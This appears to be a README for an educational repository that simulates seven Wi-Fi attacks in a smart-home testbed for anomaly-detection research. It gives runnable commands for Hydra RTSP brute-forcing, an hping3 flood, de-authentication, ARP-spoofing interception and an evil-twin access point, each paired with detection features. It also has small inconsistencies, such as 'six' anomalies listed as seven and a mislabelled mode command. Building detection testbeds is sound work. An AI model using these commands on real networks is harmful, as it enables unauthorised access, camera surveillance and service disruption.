# Wi-Fi Anomalies Repository

## Introduction
This repository provides practical guides and resources for simulating and understanding Wi-Fi anomalies in the context of smart home environments. It is designed for educational purposes and supports research on anomaly detection techniques. The content is particularly tailored to undergraduate students with limited prior experience in network security.

## Overview
Wi-Fi anomalies can impact smart home environments, causing device disconnections, unauthorized access, or even complete network disruption. This repository focuses on six key Wi-Fi anomalies:

1. Reconnaissance
2. RTSP Brute Force
3. DDoS (TCP Flood)
4. De-authentication
5. Man-in-the-Middle (MiTM)
6. Evil Twin
7. Jamming

Each anomaly includes step-by-step implementation instructions, tools required, detection features, and real-world impacts.

## Getting Started
### Prerequisites
Ensure you have the following hardware and software:

- **Hardware**:
  - Raspberry Pi 4 (or equivalent Linux-compatible system).
  - Wi-Fi adapter supporting monitor mode (e.g., Alfa AWUS036ACU).
- **Software**:
  - Kali Linux (preferred for its pre-installed tools).
  - Tools like Aireplay-ng, Bettercap, and WifiPumpkin3.

### Setting Up the Testbed
1. **Hardware Setup**:
   - Connect the Raspberry Pi to your network.
   - Attach the compatible Wi-Fi adapter.
2. **Software Installation**:
   - Update system packages:
     ```bash
     sudo apt update && sudo apt upgrade -y
     ```
   - Install required tools:
     ```bash
     sudo apt install aircrack-ng bettercap wifipumpkin3
     ```
3. **Network Configuration**:
   - Configure your router for packet capture.

### Disclaimer
This repository is intended for educational and research purposes only. Unauthorized use of these techniques may violate laws and regulations. Please ensure you have permission before testing on any network.

## Anomalies Explained

### 1. Reconnaissance
#### What is it?
Identifies and gathers information about devices and networks by scanning for available access points and devices.

#### Tools and Hardware
- **Hardware**: Laptop with Wi-Fi adapter.
- **Software**: Bettercap, Airodump-ng.

#### How to Implement
1. Install Bettercap:
   ```bash
   sudo apt install bettercap
   ```
2. Scan for devices:
   ```bash
   bettercap -eval "net.probe on; net.show"
   ```

#### Detection Features
- Surge in DNS queries or probe requests.

#### Real-World Impact
- **System**: Potential vulnerability identification.
- **User**: Privacy concerns.


### 2. RTSP Brute Force
#### What is it?
An RTSP brute force attack systematically guesses authentication credentials to gain unauthorized access to video streams from security cameras or other RTSP-enabled devices.

#### Tools and Hardware
- **Hardware**: Laptop or Raspberry Pi.
- **Software**: Kali Linux, Hydra.

#### How to Implement
1. Install Hydra:
   
   ```bash
   sudo apt install hydra
   ```

2. Use Hydra to launch a brute force attack on an RTSP stream:
    ```bash
    hydra -l <username> -P <password-list> -s <port> <target-ip> rtsp
    ```
    Replace `<username>` with the target username, `<password-list>` with the path to your password list, `<port>` with the RTSP port (default: 554), and `<target-ip>` with the IP address of the target device.

#### Detection Features
- Repeated `401 Unauthorized` responses in RTSP logs.
- Unusual login attempts from unknown IP addresses.
- Increased authentication failure rate in a short time.

#### Real-World Impact
- **System**: Unauthorized access to live video streams.
- **User**: Privacy invasion, potential surveillance exposure.


### 3. DDoS (TCP Flood)
#### What is it?
Overwhelms a target with a flood of TCP packets, leading to denial of service.

#### Tools and Hardware
- **Hardware**: Raspberry Pi or laptop.
- **Software**: hping3.

#### How to Implement
1. Install hping3:
   ```bash
   sudo apt install hping3
   ```
2. Launch the attack:
   ```bash
   sudo hping3 [Target_IP] --flood --rand-source --data 10000
   ```

#### Detection Features
- High volume of SYN packets.

#### Real-World Impact
- **System**: Network congestion.
- **User**: Inability to access services.


### 4. De-authentication Attack
#### What is it?
This attack sends de-authentication packets to disconnect devices from a network.

#### Tools and Hardware
- **Hardware**: Raspberry Pi 4, Alfa adapter (AWUS036ACU).
- **Software**: Kali Linux, Aireplay-ng.

#### How to Implement
1. Install Aircrack-ng:
   ```bash
   sudo apt install aircrack-ng
   ```
2. Put the Wi-Fi adapter into monitor mode:
   ```bash
   sudo ip link set wlan1 down
   sudo iwconfig wlan1 mode monitor
   sudo ip link set wlan1 up
   ```
3. Execute the attack:
   ```bash
   aireplay-ng --deauth 10 -a [BSSID] -c [Target_MAC] wlan1
   ```
   Replace `[BSSID]` and `[Target_MAC]` with the respective values.

#### Detection Features
- Presence of unique `de-auth` packets in PCAP files.

#### Real-World Impact
- **System**: Prevented device actuation.
- **User**: Loss of control, inconvenience.


### 5. Man-in-the-Middle (MiTM)
#### What is it?
Intercepts communication between devices without their knowledge.

#### Tools and Hardware
- **Hardware**: Laptop with Wi-Fi adapter.
- **Software**: Bettercap.

#### How to Implement
1. Run Bettercap:
   ```bash
   sudo bettercap
   ```
2. Perform ARP spoofing:
   ```bash
   set arp.spoof.targets [Target_IP]
   arp.spoof on
   net.sniff on
   ```

#### Detection Features
- Duplicate MAC addresses and mismatched ARP tables.

#### Real-World Impact
- **System**: Data interception.
- **User**: Privacy breach.


### 6. Evil Twin Attack
#### What is it?
Creates a rogue access point impersonating a legitimate network.

#### Tools and Hardware
- **Hardware**: Alfa adapter (AWUS036ACU).
- **Software**: WifiPumpkin3.

#### How to Implement
1. Install WifiPumpkin3:
   ```bash
   sudo apt install wifipumpkin3
   ```
2. Configure the adapter in monitor mode:
   ```bash
   sudo ip link set wlan1 down
   sudo iwconfig wlan1 mode managed
   sudo ip link set wlan1 up
   ```
3. Start WifiPumpkin3:
   ```bash
   sudo wifipumpkin3
   ```
4. Configure the rogue AP:
   ```bash
   set interface wlan1
   set ssid FakeSSID
   set proxy noproxy
   start
   ```

#### Detection Features
- Duplicate SSIDs with different MAC addresses.

#### Real-World Impact
- **System**: Unauthorized access.
- **User**: Privacy breach, financial risks.



### 7. Jamming
#### What is it?
Disrupts communication by saturating the Wi-Fi frequency with noise.

#### Tools and Hardware
- **Hardware**: Open Sniffer.

#### How to Implement
1. Connect the device to a laptop and configure its IP:
   ```bash
   http://10.10.10.2
   ```
2. Set frequency and power levels in the device GUI.
3. Start jamming.

#### Detection Features
- Significant packet loss and retransmission events.

#### Real-World Impact
- **System**: Severe network degradation.
- **User**: Device disconnection.

## Detection Techniques
Provide PCAP files or network traffic logs to identify anomalies. Use tools like Wireshark for analysis.

## Additional Resources
- [Wireshark Tutorial](https://www.wireshark.org/)
- [Bettercap Documentation](https://www.bettercap.org/)
- [WifiPumpkin3 Guide](https://wifipumpkin3.github.io/docs/getting-started)
- [Hydra Guide](https://github.com/vanhauser-thc/thc-hydra)

## Acknowledgments
This repository is based on research from the paper *Developing a Smart Home Testbed for Benchmarking Anomaly Detection*. Special thanks to the authors for their contributions.
